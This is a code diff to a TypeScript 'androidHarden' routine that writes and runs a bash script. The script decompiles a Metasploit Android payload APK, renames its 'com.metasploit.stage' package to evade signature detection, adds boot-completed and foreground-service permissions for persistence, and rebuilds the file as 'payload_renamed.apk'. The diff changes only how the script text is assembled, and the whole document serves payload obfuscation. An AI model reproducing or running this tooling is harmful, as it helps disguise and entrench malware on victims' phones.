@@ -80,31 +80,34 @@ async function androidHarden(opts: {
   // ── Step 2: Package + class rename ─────────────────────────
   if (opts.layers.includes("pkg_rename") || opts.layers.includes("polymorphic")) {
     const renameScript = path.join(outDir, "rename.sh");
-    fs.writeFileSync(renameScript, `#!/bin/bash
-set -e
-APK="${rawApk}"
-PKG="${pkg}"
-WORK="${outDir}/decompiled"
-OUT="${outDir}/renamed"
-
-echo "[1] Decompiling APK with apktool..."
-apktool d -f "$APK" -o "$WORK" 2>/dev/null || { echo "apktool not found - skipping"; exit 0; }
-
-echo "[2] Replacing package name..."
-PKG_SMALI=$(echo "$PKG" | tr '.' '/')
-PKG_DOTS=$(echo "$PKG" | sed 's/\./\\./g')
-find "$WORK" -type f -name "*.smali" -exec sed -i "s/com\\/metasploit\\/stage/$PKG_SMALI/g" {} \\;
-find "$WORK" -type f -name "*.xml" -exec sed -i "s/com\\.metasploit\\.stage/$PKG_DOTS/g" {} \\;
-sed -i "s/com\\.metasploit\\.stage/$PKG_DOTS/g" "$WORK/AndroidManifest.xml" 2>/dev/null || true
-
-echo "[3] Injecting foreground service manifest entries..."
-# Add FOREGROUND_SERVICE, POST_NOTIFICATIONS, BOOT_COMPLETED
-sed -i 's|</manifest>|<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/><uses-permission android:name="android.permission.POST_NOTIFICATIONS"/><uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/></manifest>|' "$WORK/AndroidManifest.xml" 2>/dev/null || true
-
-echo "[4] Rebuilding APK..."
-apktool b "$WORK" -o "$OUT/payload_renamed.apk" 2>/dev/null || true
-echo "RENAME_DONE"
-`, { mode: 0o755 });
+    const workDir = path.join(outDir, "decompiled");
+    const renamedDir = path.join(outDir, "renamed");
+    const renameScriptContent = [
+      "#!/bin/bash",
+      "set -e",
+      `APK=${JSON.stringify(rawApk)}`,
+      `PKG=${JSON.stringify(pkg)}`,
+      `WORK=${JSON.stringify(workDir)}`,
+      `OUT=${JSON.stringify(renamedDir)}`,
+      "",
+      'echo "[1] Decompiling APK with apktool..."',
+      'apktool d -f "$APK" -o "$WORK" 2>/dev/null || { echo "apktool not found - skipping"; exit 0; }',
+      "",
+      'echo "[2] Replacing package name..."',
+      "PKG_SMALI=$(echo \"$PKG\" | tr '.' '/')",
+      "PKG_DOTS=$(echo \"$PKG\" | sed 's/\\./\\\\./g')",
+      'find "$WORK" -type f -name "*.smali" -exec sed -i "s/com\\/metasploit\\/stage/$PKG_SMALI/g" {} \\;',
+      'find "$WORK" -type f -name "*.xml" -exec sed -i "s/com\\.metasploit\\.stage/$PKG_DOTS/g" {} \\;',
+      'sed -i "s/com\\.metasploit\\.stage/$PKG_DOTS/g" "$WORK/AndroidManifest.xml" 2>/dev/null || true',
+      "",
+      'echo "[3] Injecting foreground service manifest entries..."',
+      "sed -i 's|</manifest>|<uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\"/><uses-permission android:name=\"android.permission.POST_NOTIFICATIONS\"/><uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/></manifest>|' \"$WORK/AndroidManifest.xml\" 2>/dev/null || true",
+      "",
+      'echo "[4] Rebuilding APK..."',
+      'apktool b "$WORK" -o "$OUT/payload_renamed.apk" 2>/dev/null || true',
+      "echo RENAME_DONE",
+    ].join("\n");
+    fs.writeFileSync(renameScript, renameScriptContent, { mode: 0o755 });
     try {
       const { stdout } = await execAsync(`bash ${renameScript}`, { timeout: 120000 });
       const ok = stdout.includes("RENAME_DONE") || stdout.includes("apktool not found");
